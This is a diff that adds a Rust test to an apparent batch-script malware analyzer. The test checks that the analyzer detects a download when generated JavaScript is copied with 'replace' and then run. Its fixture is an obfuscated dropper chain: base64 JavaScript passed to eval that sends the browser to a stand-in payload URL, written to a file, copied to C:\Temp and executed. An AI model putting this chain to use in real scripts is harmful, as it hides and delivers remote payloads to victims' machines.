@@ -8425,6 +8425,36 @@ call C:\Temp\original.js"#,
 
 #[cfg(test)]
 #[allow(clippy::unwrap_used, clippy::expect_used, clippy::panic)]
+mod replace_tests {
+    use crate::analyze;
+    use crate::env::Config;
+    use crate::traits::Trait;
+
+    #[test]
+    fn replace_directory_destination_preserves_generated_script_content() {
+        let report = analyze(
+            br#"echo eval(atob("ZG9jdW1lbnQubG9jYXRpb249J2h0dHBzOi8vcmVwbGFjZS1kaXItanMuZXhhbXBsZS9wYXlsb2FkJw==")) > original.js
+replace original.js C:\Temp
+call C:\Temp\original.js"#,
+            &Config::default(),
+        );
+
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, .. }
+                        if src == "https://replace-dir-js.example/payload"
+                )
+            }),
+            "replace copied generated JS content was not analyzed: {:?}",
+            report.traits
+        );
+    }
+}
+
+#[cfg(test)]
+#[allow(clippy::unwrap_used, clippy::expect_used, clippy::panic)]
 mod wmic_tests {
     use crate::analyze;
     use crate::env::{Config, Environment};
